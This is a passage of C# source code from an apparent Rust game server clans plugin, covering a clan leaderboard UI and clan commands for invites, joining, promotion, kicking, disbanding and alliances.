                    RectTransform = { AnchorMin = $"0.08 0", AnchorMax = $"0.1355833 1" },
                }, "clans_player" + key.Key);

                elements.Add(new CuiLabel
                {
                    Text = { Text = key.Value.tag.ToUpper(), Font = "robotocondensed-bold.ttf", FontSize = 14, Color = "1 0.9294118 0.8666667 1", Align = TextAnchor.MiddleLeft },
                    RectTransform = { AnchorMin = $"0.1329573 0", AnchorMax = $"0.6983538 1" },
                }, "clans_player" + key.Key);
                // ReSharper disable once PossibleInvalidOperationException
                if ((bool) Tournament?.Call<bool>("CheckTournament", ulong.Parse(key.Value.owner)) == true)
                {
                    elements.Add(new CuiLabel
                    {
                        Text = { Text = "УЧАВСТВУЮТ В ТУРНИРЕ", Font = "robotocondensed-bold.ttf", FontSize = 14, Color = "0 255 38 0.5", Align = TextAnchor.MiddleCenter },
                        RectTransform = { AnchorMin = $"0 0", AnchorMax = $"1 1" },
                    }, "clans_player" + key.Key);
                }
                else
                {
                    elements.Add(new CuiLabel
                    {
                        Text = { Text = "НЕ УЧАВСТВУЮТ В ТУРНИРЕ", Font = "robotocondensed-bold.ttf", FontSize = 14, Color = "255 0 0 0.5", Align = TextAnchor.MiddleCenter },
                        RectTransform = { AnchorMin = $"0 0", AnchorMax = $"1 1" },
                    }, "clans_player" + key.Key);
                }


                elements.Add(new CuiLabel
                {
                    Text = { Text = key.Value.ClanPoints.ToString(), Font = "robotocondensed-bold.ttf", FontSize = 14, Color = "1 0.9294118 0.8666667 1", Align = TextAnchor.MiddleCenter },
                    RectTransform = { AnchorMin = $"0.7298629 0", AnchorMax = $"0.8270121 1" },
                }, "clans_player" + key.Key);

                elements.Add(new CuiLabel
                {
                    Text = { Text = $"{key.Value.online}/{key.Value.members.Count}".ToUpper(), Font = "robotocondensed-bold.ttf", FontSize = 14, Color = "1 0.9294118 0.8666667 1", Align = TextAnchor.MiddleCenter },
                    RectTransform = { AnchorMin = $"0.8585205 0", AnchorMax = $"0.9985565 1" },
                }, "clans_player" + key.Key);

                elements.Add(new CuiButton
                {
                    Button = { Color = "0.25 0.25 0.23 0", Command = $"clanstop_info {key.Value.tag}" },
                    Text = { Text = "", Align = TextAnchor.MiddleCenter, FontSize = 14, Font = "robotocondensed-bold.ttf", Color = "1 0.9294118 0.8666667 1" },
                    RectTransform = { AnchorMin = $"0 0", AnchorMax = $"1 1" },
                }, "clans_player" + key.Key);
                i++;
                Amin = Amin - 0.073;
                Amax = Amax - 0.073;
            }
            elements.Add(new CuiButton
            {
                Button = { Color = "0.25 0.25 0.23 0.9" },
                Text = { Text = "" },
                RectTransform = { AnchorMin = $"0.01 0.003", AnchorMax = $"0.1 0.048" },
            }, "Clanstop_main8", "clans_page");
            elements.Add(new CuiButton
            {
                Button = { Color = "0.4039216 0.3921569 0.372549 0.7", Command = page > 0 ? $"clanstop_main {page - 1}" : "" },
                Text = { Text = "<", Color = "1 0.9294118 0.8666667 1", FontSize = 15, Font = "robotocondensed-bold.ttf", Align = TextAnchor.MiddleCenter },
                RectTransform = { AnchorMin = $"0 0", AnchorMax = $"0.33 0.997" },
            }, "clans_page");

            elements.Add(new CuiButton
            {
                Button = { Color = "0.3294118 0.3294118 0.3294118 0" },
                Text = { Text = $"{page + 1}", Color = "1 0.9294118 0.8666667 1", Font = "robotocondensed-bold.ttf", FontSize = 13, Align = TextAnchor.MiddleCenter },
                RectTransform = { AnchorMin = $"0.33 0", AnchorMax = $"0.66 0.997" },
            }, "clans_page");

            elements.Add(new CuiButton
            {
                Button = { Color = "0.4039216 0.3921569 0.372549 0.7", Command = clans.Keys.Skip(10 * (page + 1)).Count() > 0 ? $"clanstop_main {page + 1}" : "" },
                Text = { Text = ">", Color = "1 0.9294118 0.8666667 1", FontSize = 15, Font = "robotocondensed-bold.ttf", Align = TextAnchor.MiddleCenter },
                RectTransform = { AnchorMin = $"0.66 0", AnchorMax = $"0.997 0.997" },
            }, "clans_page");
            CuiHelper.AddUi(player, elements);
        }


        long GetFullPercent(string id)
        {
            var clan = findClanByUser(id);
            long Need = clan.Change.Sum(x => x.Value.Need);
            var playerCurrent = clan.members[id].GatherInfo.Sum(p => p.Value);
            if (playerCurrent == 0) return 0;
            return playerCurrent * 100 / Need;
        }

        long GetFullClanPercent(string tag)
        {
            var clan = findClan(tag);
            long Need = clan.Change.Sum(x => x.Value.Need);
            var Current = clan.Change.Sum(x => x.Value.Complete);
            if (Current == 0) return 0;
            return Current * 100 / Need;
        }

        public static string FormatShortTime(TimeSpan time)
        {
            string result = string.Empty;
            if (time.Days != 0)
                result += $"{time.Days} д. ";

            if (time.Hours != 0)
                result += $"{time.Hours} ч. ";

            if (time.Minutes != 0)
                result += $"{time.Minutes} м. ";

            if (time.Seconds != 0)
                result += $"{time.Seconds} с. ";

            return result;
        }

        public void WithdrawPlayer(BasePlayer player, string targetId) => cmdClanWithdraw(player, new string[] { "", targetId });

        void cmdClanWithdraw(BasePlayer player, string[] args)
        {
            var current = this.covalence.Players.FindPlayerById(player.UserIDString);
            var myClan = findClanByUser(current.Id);
            if (myClan == null)
            {
                PrintChat(player, string.Format(msg("notmember", current.Id)));
                return;
            }
            if (args.Length < 2)
            {
                PrintChat(player, string.Format(msg("usagewithdraw", current.Id), colorCmdUsage));
                return;
            }
            if (!myClan.IsOwner(current.Id) && !myClan.IsCouncil(current.Id) && !myClan.IsModerator(current.Id))
            {
                PrintChat(player, string.Format(msg("notmoderator", current.Id)));
                return;
            }
            var disinvPlayer = myClan.GetIPlayer(args[1]);
            if (disinvPlayer == null)
            {
                PrintChat(player, string.Format(msg("nosuchplayer", current.Id), args[1]));
                return;
            }
            if (myClan.members.ContainsKey(disinvPlayer.Id))
            {
                PrintChat(player, string.Format(msg("alreadymember", current.Id), disinvPlayer.Name));
                return;
            }
            if (!myClan.invites.ContainsKey(disinvPlayer.Id))
            {
                PrintChat(player, string.Format(msg("notinvited", current.Id), disinvPlayer.Name));
                return;
            }
            myClan.invites.Remove(disinvPlayer.Id);
            if (pendingPlayerInvites.ContainsKey(disinvPlayer.Id)) pendingPlayerInvites[disinvPlayer.Id].Remove(myClan.tag);
            myClan.BroadcastLoc("canceledinvite", myClan.ColNam(current.Id, current.Name), myClan.ColNam(disinvPlayer.Id, disinvPlayer.Name));
            myClan.updated = UnixTimeStampUTC();
        }
        void cmdClanJoin(BasePlayer player, string[] args)
        {
            var current = this.covalence.Players.FindPlayerById(player.UserIDString);
            var myClan = findClanByUser(current.Id);
            if (myClan != null)
            {
                PrintChat(player, string.Format(msg("youalreadymember", current.Id)));
                return;
            }
            if (usePermToJoinClan && !permission.UserHasPermission(current.Id, permissionToJoinClan))
            {
                PrintChat(player, msg("nopermtojoin", current.Id));
                return;
            }
            if (args.Length != 2)
            {
                PrintChat(player, string.Format(msg("usagejoin", current.Id), colorCmdUsage));
                return;
            }
            myClan = findClan(args[1]);
            if (myClan == null || !myClan.IsInvited(current.Id))
            {
                PrintChat(player, string.Format(msg("younotinvited", current.Id)));
                return;
            }
            if (limitMembers >= 0 && myClan.members.Count() >= limitMembers)
            {
                PrintChat(player, string.Format(msg("reachedmaximum", current.Id)));
                return;
            }
            myClan.invites.Remove(current.Id);
            pendingPlayerInvites.Remove(current.Id);
            myClan.members.Add(current.Id, new PlayerStats());
            clanCache[current.Id] = myClan;
            myClan.AddBasePlayer(player);
            SetupPlayer(player, current, clan: myClan);


            if (usePermGroups && !permission.UserHasGroup(current.Id, permGroupPrefix + myClan.tag)) permission.AddUserGroup(current.Id, permGroupPrefix + myClan.tag);
            myClan.BroadcastLoc("playerjoined", myClan.ColNam(current.Id, current.Name));
            myClan.updated = UnixTimeStampUTC();
            myClan.total++;
            myClan.OnUpdate();
            List<string> others = new List<string>(myClan.members.Keys);
            others.Remove(current.Id);
            Interface.Oxide.CallHook("OnClanMemberJoined", current.Id, others);
        }


        [ConsoleCommand("clanui_promote")]
        void cmdClanPromoteMember(ConsoleSystem.Arg args)
        {
            var player = args.Player();
            if (player == null) return;

            var clan = findClanByUser(player.UserIDString);
            if (!clan.IsOwner(player.UserIDString)) return;

            switch (args.Args[0].ToLower())
            {
                case "promote":
                    PromotePlayer(player, args.Args[1]);
                    break;
                case "demote":
                    DemotePlayer(player, args.Args[1]);
                    break;
            }

            var playerStats = clan.GetPlayerStats(args.Args[1]);
            if (playerStats == null) return;
            CreatePlayerInfo(player, clan, playerStats, args.Args[1]);
        }

        public void PromotePlayer(BasePlayer player, string targetId) => cmdClanPromote(player, new string[] { "", targetId });

        void cmdClanPromote(BasePlayer player, string[] args)
        {
            var current = this.covalence.Players.FindPlayerById(player.UserIDString);
            var myClan = findClanByUser(current.Id);
            if (myClan == null)
            {
                PrintChat(player, string.Format(msg("notmember", current.Id)));
                return;
            }
            if (!myClan.IsOwner(current.Id))
            {
                PrintChat(player, string.Format(msg("needclanowner", current.Id)));
                return;
            }
            if (args.Length != 2)
            {
                PrintChat(player, string.Format(msg("usagepromote", current.Id), colorCmdUsage));
                return;
            }
            var promotePlayer = myClan.GetIMember(args[1]);
            if (promotePlayer == null)
            {
                PrintChat(player, string.Format(msg("nosuchplayer", current.Id), args[1]));
                return;
            }
            if (!myClan.IsMember(promotePlayer.Id))
            {
                PrintChat(player, string.Format(msg("notaclanmember", current.Id), promotePlayer.Name));
                return;
            }
            if (enableClanAllies && myClan.IsCouncil(promotePlayer.Id))
            {
                PrintChat(player, string.Format(msg("alreadyacouncil", current.Id), promotePlayer.Name));
                return;
            }
            if (enableClanAllies && myClan.council != null && myClan.IsModerator(promotePlayer.Id))
            {
                PrintChat(player, string.Format(msg("alreadyacouncilset", current.Id), promotePlayer.Name));
                return;
            }
            if (!enableClanAllies && myClan.IsModerator(promotePlayer.Id))
            {
                PrintChat(player, string.Format(msg("alreadyamod", current.Id), promotePlayer.Name));
                return;
            }
            if (!myClan.IsModerator(promotePlayer.Id) && limitModerators >= 0 && myClan.moderators.Count() >= limitModerators)
            {
                PrintChat(player, string.Format(msg("maximummods", current.Id)));
                return;
            }
            if (enableClanAllies && myClan.IsModerator(promotePlayer.Id))
            {
                myClan.council = promotePlayer.Id;
                myClan.moderators.Remove(promotePlayer.Id);
                myClan.BroadcastLoc("playerpromotedcouncil", myClan.ColNam(current.Id, current.Name), myClan.ColNam(promotePlayer.Id, promotePlayer.Name));
            }
            else
            {
                myClan.moderators.Add(promotePlayer.Id);
                myClan.BroadcastLoc("playerpromoted", myClan.ColNam(current.Id, current.Name), myClan.ColNam(promotePlayer.Id, promotePlayer.Name));
            }
            myClan.updated = UnixTimeStampUTC();
            myClan.OnUpdate();
        }
        public void DemotePlayer(BasePlayer player, string targetId) => cmdClanDemote(player, new string[] {
"", targetId
}
        );
        void cmdClanDemote(BasePlayer player, string[] args)
        {
            var current = this.covalence.Players.FindPlayerById(player.UserIDString);
            var myClan = findClanByUser(current.Id);
            if (myClan == null)
            {
                PrintChat(player, string.Format(msg("notmember", current.Id)));
                return;
            }
            if (!myClan.IsOwner(current.Id))
            {
                PrintChat(player, string.Format(msg("needclanowner", current.Id)));
                return;
            }
            if (args.Length < 2)
            {
                PrintChat(player, string.Format(msg("usagedemote", current.Id), colorCmdUsage));
                return;
            }
            var demotePlayer = myClan.GetIMember(args[1]);
            if (demotePlayer == null)
            {
                PrintChat(player, string.Format(msg("nosuchplayer", current.Id), args[1]));
                return;
            }
            if (!myClan.IsMember(demotePlayer.Id))
            {
                PrintChat(player, string.Format(msg("notaclanmember", current.Id), demotePlayer.Name));
                return;
            }
            if (!myClan.IsModerator(demotePlayer.Id) && !myClan.IsCouncil(demotePlayer.Id))
            {
                PrintChat(player, string.Format(msg("notpromoted", current.Id), demotePlayer.Name));
                return;
            }
            if (enableClanAllies && myClan.IsCouncil(demotePlayer.Id))
            {
                myClan.council = null;
                if (limitModerators >= 0 && myClan.moderators.Count() >= limitModerators) myClan.BroadcastLoc("playerdemoted", myClan.ColNam(current.Id, current.Name), myClan.ColNam(demotePlayer.Id, demotePlayer.Name));
                else
                {
                    myClan.moderators.Add(demotePlayer.Id);
                    myClan.BroadcastLoc("councildemoted", myClan.ColNam(current.Id, current.Name), myClan.ColNam(demotePlayer.Id, demotePlayer.Name));
                }
            }
            else
            {
                myClan.moderators.Remove(demotePlayer.Id);
                myClan.BroadcastLoc("playerdemoted", myClan.ColNam(current.Id, current.Name), myClan.ColNam(demotePlayer.Id, demotePlayer.Name));
            }
            myClan.updated = UnixTimeStampUTC();
            myClan.OnUpdate();
        }
        public void LeaveClan(BasePlayer player) => cmdClanLeave(player, new string[] {
"leave"
}
        );
        void cmdClanLeave(BasePlayer player, string[] args)
        {
            var current = this.covalence.Players.FindPlayerById(player.UserIDString);
            var myClan = findClanByUser(current.Id);
            bool lastMember = false;
            if (myClan == null)
            {
                PrintChat(player, string.Format(msg("notmember", current.Id)));
                return;
            }
            if (args.Length != 1)
            {
                PrintChat(player, string.Format(msg("usageleave", current.Id), colorCmdUsage));
                return;
            }
            if (myClan.members.Count() == 1)
            {
                RemoveClan(myClan.tag);
                lastMember = true;
            }
            else
            {
                if (myClan.IsCouncil(current.Id)) myClan.council = null;
                myClan.moderators.Remove(current.Id);
                myClan.members.Remove(current.Id);
                myClan.invites.Remove(current.Id);
                if (myClan.IsOwner(current.Id) && myClan.members.Count() > 0)
                {
                    myClan.owner = myClan.members.ToList()[0].Key;
                }
            }
            clanCache.Remove(current.Id);
            SetupPlayer(player, current, true, oldTag: myClan.tag);
            if (usePermGroups && permission.UserHasGroup(current.Id, permGroupPrefix + myClan.tag)) permission.RemoveUserGroup(current.Id, permGroupPrefix + myClan.tag);
            RemoveRadar(player, myClan.tag, true);
            PrintChat(player, string.Format(msg("youleft", current.Id)));
            myClan.BroadcastLoc("playerleft", myClan.ColNam(current.Id, current.Name));
            myClan.updated = UnixTimeStampUTC();
            myClan.total--;
            myClan.OnUpdate();
            if (lastMember) myClan.OnDestroy();
            if (!lastMember) Interface.Oxide.CallHook("OnClanMemberGone", current.Id, myClan.members.ToList());
        }
        public void KickPlayer(BasePlayer player, string targetId) => cmdClanKick(player, new string[] {
"", targetId
}
        );
        void cmdClanKick(BasePlayer player, string[] args)
        {
            var current = this.covalence.Players.FindPlayerById(player.UserIDString);
            var myClan = findClanByUser(current.Id);
            if (myClan == null)
            {
                PrintChat(player, string.Format(msg("notmember", current.Id)));
                return;
            }
            if (!myClan.IsOwner(current.Id) && !myClan.IsCouncil(current.Id) && !myClan.IsModerator(current.Id))
            {
                PrintChat(player, string.Format(msg("notmoderator", current.Id)));
                return;
            }
            if (args.Length != 2)
            {
                PrintChat(player, string.Format(msg("usagekick", current.Id), colorCmdUsage));
                return;
            }
            var kickPlayer = myClan.GetIMember(args[1]);
            if (kickPlayer == null)
            {
                PrintChat(player, string.Format(msg("nosuchplayer", current.Id), args[1]));
                return;
            }
            if (!myClan.IsMember(kickPlayer.Id) && !myClan.IsInvited(kickPlayer.Id))
            {
                PrintChat(player, string.Format(msg("notmembercannotkicked", current.Id), kickPlayer.Name));
                return;
            }
            if (myClan.IsOwner(kickPlayer.Id) || myClan.IsCouncil(kickPlayer.Id) || myClan.IsModerator(kickPlayer.Id))
            {
                PrintChat(player, string.Format(msg("modownercannotkicked", current.Id), kickPlayer.Name));
                return;
            }
            foreach (var value in myClan.members)
            {
                var turrets = UnityEngine.Object.FindObjectsOfType<AutoTurret>();
                foreach (var turret in turrets)
                {
                    if (turret.OwnerID != ulong.Parse(value.Key)) continue;
                    turret.authorizedPlayers.RemoveAll(a => a.userid == ulong.Parse(kickPlayer.Id));
                }
            }
            if (myClan.members.ContainsKey(kickPlayer.Id)) myClan.total--;
            myClan.members.Remove(kickPlayer.Id);
            myClan.invites.Remove(kickPlayer.Id);
            if (pendingPlayerInvites.ContainsKey(kickPlayer.Id)) pendingPlayerInvites[kickPlayer.Id].Remove(myClan.tag);
            clanCache.Remove(kickPlayer.Id);
            var kickBasePlayer =BasePlayer.Find(kickPlayer.Id);

            if (kickBasePlayer != null)
            {
                SetupPlayer(kickBasePlayer, kickPlayer, true, oldTag: myClan.tag);
                RemoveRadar(kickBasePlayer, myClan.tag, true);
            }
            if (usePermGroups && permission.UserHasGroup(kickPlayer.Id, permGroupPrefix + myClan.tag)) permission.RemoveUserGroup(kickPlayer.Id, permGroupPrefix + myClan.tag);
			
			
			//var clan = findClanByUser(player.UserIDString);
			//clan.ClanPoints -= PlayerPoints;
			
			
			
            myClan.BroadcastLoc("waskicked", myClan.ColNam(current.Id, current.Name), myClan.ColNam(kickPlayer.Id, kickPlayer.Name));
            myClan.updated = UnixTimeStampUTC();
            myClan.OnUpdate();
            Interface.Oxide.CallHook("OnClanMemberGone", kickPlayer.Id, myClan.members);
        }
        public void DisbandClan(BasePlayer player) => cmdClanDisband(player, new string[] {
"disband", "forever"
}
        );
        void cmdClanDisband(BasePlayer player, string[] args)
        {
            var current = this.covalence.Players.FindPlayerById(player.UserIDString);
            var myClan = findClanByUser(current.Id);
            bool lastMember = false;
            if (myClan == null)
            {
                PrintChat(player, string.Format(msg("notmember", current.Id)));
                return;
            }
            if (!myClan.IsOwner(current.Id))
            {
                PrintChat(player, string.Format(msg("needclanowner", current.Id)));
                return;
            }
            if (args.Length != 2)
            {
                PrintChat(player, string.Format(msg("usagedisband", current.Id), colorCmdUsage));
                return;
            }
            if (myClan.members.Count() == 1)
            {
                lastMember = true;
            }
            setupPlayers(myClan.members.Keys.ToList(), true, myClan.tag);

            RemoveRadarGroup(myClan.members.Keys.ToList(), myClan.tag, true);
            RemoveClan(myClan.tag);
            foreach (var member in myClan.members)
            {
                clanCache.Remove(member.Key);
                if (usePermGroups && permission.UserHasGroup((string)member.Key, permGroupPrefix + myClan.tag)) permission.RemoveUserGroup((string)member.Key, permGroupPrefix + myClan.tag);
            }
            myClan.BroadcastLoc("clandisbanded");

            foreach (var ally in clans)
            {
                Clan allyClan = clans[ally.Key];
                allyClan.clanAlliances.Remove(myClan.tag);
                allyClan.invitedAllies.Remove(myClan.tag);
                allyClan.pendingInvites.Remove(myClan.tag);
            }
            if (usePermGroups && permission.GroupExists(permGroupPrefix + myClan.tag)) permission.RemoveGroup(permGroupPrefix + myClan.tag);
            myClan.OnDestroy();
            AllyRemovalCheck();
            if (!lastMember) Interface.Oxide.CallHook("OnClanDisbanded", myClan.members);
        }
        public void Alliance(BasePlayer player, string targetClan, string type) => cmdChatClanAlly(player, "ally", new string[] {
type, targetClan
}
        );
        void cmdChatClanAlly(BasePlayer player, string command, string[] args)
        {
            if (!enableClanAllies || player == null) return;
            var current = this.covalence.Players.FindPlayerById(player.UserIDString);
            var myClan = findClanByUser(current.Id);
            if (myClan == null)
            {
                PrintChat(player, string.Format(msg("notmember", current.Id)));
                return;
            }
            if (!myClan.IsOwner(current.Id) && !myClan.IsCouncil(current.Id))
            {
                PrintChat(player, string.Format(msg("needclanownercouncil", current.Id)));
                return;
            }
            if (args == null || args.Length == 0)
            {
                var sbally = new StringBuilder();

                string Messages = pluginPrefixREBORNShow == true ? $"<size=14><color={pluginPrefixREBORNColor}>REBORN\n</color></size>" : "\n";
                sbally.Append($"<size=18><color={pluginPrefixColor}>{this.Title}</color></size>{Messages}");
                sbally.Append($"<color={colorTextMsg}>");
                if (myClan.IsOwner(current.Id)) sbally.Append(string.Format(msg("youareownerof", current.Id)));
                else if (myClan.IsCouncil(current.Id)) sbally.Append(string.Format(msg("youarecouncilof", current.Id)));
                else if (myClan.IsModerator(current.Id)) sbally.Append(string.Format(msg("youaremodof", current.Id)));
                else sbally.Append(string.Format(msg("youarememberof", current.Id)));
                sbally.AppendLine($" <color={colorClanNamesOverview}>{myClan.tag}</color> ( {myClan.online}/{myClan.total} )");
                if (myClan.clanAlliances.Count() > 0) sbally.AppendLine(string.Format(msg("yourclanallies", current.Id)) + $" <color={colorClanNamesOverview}>" + string.Join(", ", myClan.clanAlliances.ToArray()) + "</color>");
                if ((myClan.invitedAllies.Count() > 0 || myClan.pendingInvites.Count() > 0) && (myClan.IsOwner(current.Id) || myClan.IsCouncil(current.Id)))
                {
                    if (myClan.invitedAllies.Count() > 0) sbally.Append(string.Format(msg("allyinvites", current.Id)) + $" <color={colorClanNamesOverview}>" + string.Join(", ", myClan.invitedAllies.ToArray()) + "</color> ");
                    if (myClan.pendingInvites.Count() > 0) sbally.Append(string.Format(msg("allypending", current.Id)) + $" <color={colorClanNamesOverview}>" + string.Join(", ", myClan.pendingInvites.ToArray()) + "</color> ");
                    sbally.AppendLine();
                }
                string commandtext = string.Empty;
                if (command.Contains("ally")) commandtext = command;
                else commandtext = chatCommandClan + " ally";
                sbally.AppendLine($"<color={colorCmdUsage}>/{commandtext} <{msg("allyArgRequest", current.Id)} | {msg("allyArgRequestShort", current.Id)}> <clantag></color>");
                sbally.AppendLine(" " + msg("allyReqHelp", current.Id));
                sbally.AppendLine($"<color={colorCmdUsage}>/{commandtext} <{msg("allyArgAccept", current.Id)} | {msg("allyArgAcceptShort", current.Id)}> <clantag></color>");
                sbally.AppendLine(" " + msg("allyAccHelp", current.Id));
                sbally.AppendLine($"<color={colorCmdUsage}>/{commandtext} <{msg("allyArgDecline", current.Id)} | {msg("allyArgDeclineShort", current.Id)}> <clantag></color>");
                sbally.AppendLine(" " + msg("allyDecHelp", current.Id));
                sbally.AppendLine($"<color={colorCmdUsage}>/{commandtext} <{msg("allyArgCancel", current.Id)} | {msg("allyArgCancelShort", current.Id)}> <clantag></color>");
                sbally.AppendLine(" " + msg("allyCanHelp", current.Id));
                sbally.Append("</color>");
                SendReply(player, sbally.ToString().TrimEnd());
                return;
            }
            else if (args != null && args.Length >= 1 && args.Length < 2)
            {
                PrintChat(player, string.Format(msg("allyProvideName", current.Id)));
                return;
            }
            else if (args.Length >= 1)
            {
                Clan targetClan = null;
                string opt = args[0];
                if (opt == msg("allyArgRequest", current.Id) || opt == msg("allyArgRequestShort", current.Id))
                {
                    if (limitAlliances != 0 && myClan.clanAlliances.Count >= limitAlliances)
                    {
                        PrintChat(player, string.Format(msg("allyLimit", current.Id)));
                        return;
                    }
                    if (myClan.invitedAllies.Contains(args[1]))
                    {
                        PrintChat(player, string.Format(msg("invitePending", current.Id), args[1]));
                        return;
                    }
                    if (myClan.clanAlliances.Contains(args[1]))
                    {
                        PrintChat(player, string.Format(msg("alreadyAllies", current.Id)));
                        return;
                    }
                    targetClan = findClan(args[1]);
                    if (targetClan == null)
                    {
                        PrintChat(player, string.Format(msg("clanNoExist", current.Id), args[1]));
                        return;
                    }
                    targetClan.pendingInvites.Add(myClan.tag);
                    myClan.invitedAllies.Add(targetClan.tag);
                    PrintChat(player, string.Format(msg("allyReq", current.Id), args[1]));
                    targetClan.AllyBroadcastLoc("reqAlliance", myClan.tag);
                    myClan.OnUpdate();
                    targetClan.OnUpdate();
                    return;
                }
                else if (opt == msg("allyArgAccept", current.Id) || opt == msg("allyArgAcceptShort", current.Id))
                {
                    if (!myClan.pendingInvites.Contains(args[1]))
                    {
                        PrintChat(player, string.Format(msg("noAllyInv", current.Id), args[1]));
                        return;
                    }
                    targetClan = findClan(args[1]);
                    if (targetClan == null)
                    {
                        PrintChat(player, string.Format(msg("clanNoExist", current.Id), args[1]));
                        return;
                    }
                    if (limitAlliances != 0 && myClan.clanAlliances.Count >= limitAlliances)
                    {
                        PrintChat(player, string.Format(msg("allyAccLimit", current.Id), targetClan.tag));
                        targetClan.invitedAllies.Remove(myClan.tag);
                        myClan.pendingInvites.Remove(targetClan.tag);
                        return;
                    }
                    targetClan.invitedAllies.Remove(myClan.tag);
                    targetClan.clanAlliances.Add(myClan.tag);
                    myClan.pendingInvites.Remove(targetClan.tag);
                    myClan.clanAlliances.Add(targetClan.tag);
                    myClan.OnUpdate();
                    targetClan.OnUpdate();
                    PrintChat(player, string.Format(msg("allyAcc", current.Id), targetClan.tag));
                    targetClan.AllyBroadcastLoc("allyAccSucc", myClan.tag);
                    return;
                }
                else if (opt == msg("allyArgDeclineallyArgDecline", current.Id) || opt == msg("allyArgDeclineShort", current.Id))
                {
                    if (!myClan.pendingInvites.Contains(args[1]))
                    {
                        PrintChat(player, string.Format(msg("noAllyInv", current.Id), args[1]));
                        return;
                    }
                    targetClan = findClan(args[1]);
                    if (targetClan == null)
                    {
                        PrintChat(player, string.Format(msg("clanNoExist", current.Id), args[1]));
                        return;
                    }
                    targetClan.invitedAllies.Remove(myClan.tag);
                    myClan.pendingInvites.Remove(targetClan.tag);
                    AllyRemovalCheck();
                    PrintChat(player, string.Format(msg("allyDeclined", current.Id), args[1]));
                    myClan.OnUpdate();
                    targetClan.OnUpdate();
                    targetClan.AllyBroadcastLoc("allyDeclinedSucc", myClan.tag);
                    return;
                }
                else if (opt == msg("allyArgCancel", current.Id) || opt == msg("allyArgCancelShort", current.Id))
                {
                    if (!myClan.clanAlliances.Contains(args[1]))
                    {
                        if (myClan.invitedAllies.Contains(args[1]))
                        {
                            myClan.invitedAllies.Remove(args[1]);
                            targetClan = findClan(args[1]);
                            if (targetClan != null) targetClan.pendingInvites.Remove(myClan.tag);
                            PrintChat(player, string.Format(msg("allyInvWithdraw", current.Id), args[1]));
                            myClan.OnUpdate();
                            targetClan.OnUpdate();
                            return;
                        }
                        PrintChat(player, string.Format(msg("noAlly", current.Id)));
                        return;
                    }
                    targetClan = findClan(args[1]);
                    if (targetClan == null)
                    {
                        PrintChat(player, string.Format(msg("clanNoExist", current.Id), args[1]));
                        return;
                    }
                    targetClan.clanAlliances.Remove(myClan.tag);
                    myClan.clanAlliances.Remove(targetClan.tag);
                    AllyRemovalCheck();
                    PrintChat(player, string.Format(msg("allyCancel", current.Id), args[1]));
                    myClan.OnUpdate();
                    targetClan.OnUpdate();
                    targetClan.AllyBroadcastLoc("allyCancelSucc", myClan.tag);
                    return;
                }
                else cmdChatClanAlly(player, command, new string[] { }
                );
            }
        }
        void cmdChatClanHelp(BasePlayer player, string command, string[] args)
        {
            if (player == null) return;
            var current = this.covalence.Players.FindPlayerById(player.UserIDString);
            var myClan = findClanByUser(current.Id);
            var sb = new StringBuilder();
            if (myClan == null)
            {
                sb.Append($"<color={colorTextMsg}>");
                sb.AppendLine(msg("helpavailablecmds", current.Id));
                sb.AppendLine($"<color={colorCmdUsage}>/{chatCommandClan} {msg("clanArgCreate", current.Id)} \"TAG\" \"Description\"</color> - {msg("helpcreate", current.Id)}");
                sb.Append($"<color={colorCmdUsage}>/{chatCommandClan} {msg("clanArgJoin", current.Id)} \"TAG\"</color> - {msg("helpjoin", current.Id)}");
                sb.Append("</color>");
                SendReply(player, sb.ToString().TrimEnd());
                return;
            }
            sb.AppendLine(msg("helpavailablecmds", current.Id));
            sb.AppendLine($"<color={colorCmdUsage}>/{chatCommandClan}</color> - {msg("helpinformation", current.Id)}");
            sb.AppendLine($"<color={colorCmdUsage}>/{chatCommandClanChat} <msg></color> - {msg("helpmessagemembers", current.Id)}");
            if (enableClanAllies) sb.AppendLine($"<color={colorCmdUsage}>/{chatCommandAllyChat} <msg></color> - {msg("helpmessageally", current.Id)}");
            sb.AppendLine($"<color={colorCmdUsage}>/{chatCommandClan} {msg("clanArgLeave", current.Id)}</color> - {msg("helpleave", current.Id)}");
            if (enableFFOPtion) sb.AppendLine($"<color={colorCmdUsage}>/{chatCommandClan} {msg("clanArgFF", current.Id)} |  /{chatCommandFF}</color> - {msg("helptoggleff", current.Id)}");
            if ((enableClanRadar && !usePermissionClanRadar) || enableClanRadar && usePermissionClanRadar && permission.UserHasPermission(current.Id, permissionClanRadarUse)) sb.AppendLine($"<color={colorCmdUsage}>/{chatCommandClan} {msg("clanArgRadar", current.Id)} | /{chatCommandRadar}</color> - {msg("helptoggleradar", current.Id)}");
            if ((myClan.IsOwner(current.Id) || myClan.IsCouncil(current.Id) || myClan.IsModerator(current.Id)))
            {
                sb.AppendLine($"<color={clanModeratorColor}>{msg("helpmoderator", current.Id)}</color> {msg("helpcommands", current.Id)}");
                sb.AppendLine($"<color={colorCmdUsage}>/{chatCommandClan} {msg("clanArgInvite", current.Id)} {msg("clanArgNameId", current.Id)}</color> - {msg("helpinvite", current.Id)}");
                sb.AppendLine($"<color={colorCmdUsage}>/{chatCommandClan} {msg("clanArgWithdraw", current.Id)} {msg("clanArgNameId", current.Id)}</color> - {msg("helpwithdraw", current.Id)}");
                sb.AppendLine($"<color={colorCmdUsage}>/{chatCommandClan} {msg("clanArgKick", current.Id)} {msg("clanArgNameId", current.Id)}</color> - {msg("helpkick", current.Id)}");
            }
            if ((myClan.IsOwner(current.Id) || (enableClanAllies && myClan.IsCouncil(current.Id))))
            {
                sb.AppendLine($"<color={clanOwnerColor}>{msg("helpowner", current.Id)}</color> {msg("helpcommands", current.Id)}");
                if (enableClanAllies) sb.AppendLine($"<color={colorCmdUsage}>/{chatCommandClan} {msg("clanArgAlly", current.Id)} | {chatCommandClan + "ally"}</color> - {msg("helpallyoptions", current.Id)}");
                if (myClan.IsOwner(current.Id)) sb.AppendLine($"<color={colorCmdUsage}>/{chatCommandClan} {msg("clanArgPromote", current.Id)} {msg("clanArgNameId", current.Id)}</color> - {msg("helppromote", current.Id)}");
                if (myClan.IsOwner(current.Id)) sb.AppendLine($"<color={colorCmdUsage}>/{chatCommandClan} {msg("clanArgDemote", current.Id)} {msg("clanArgNameId", current.Id)}</color> - {msg("helpdemote", current.Id)}");
                if (myClan.IsOwner(current.Id)) sb.AppendLine($"<color={colorCmdUsage}>/{chatCommandClan} {msg("clanArgDisband", current.Id)} {msg("clanArgForever", current.Id)}</color> - {msg("helpdisband", current.Id)}");
            }
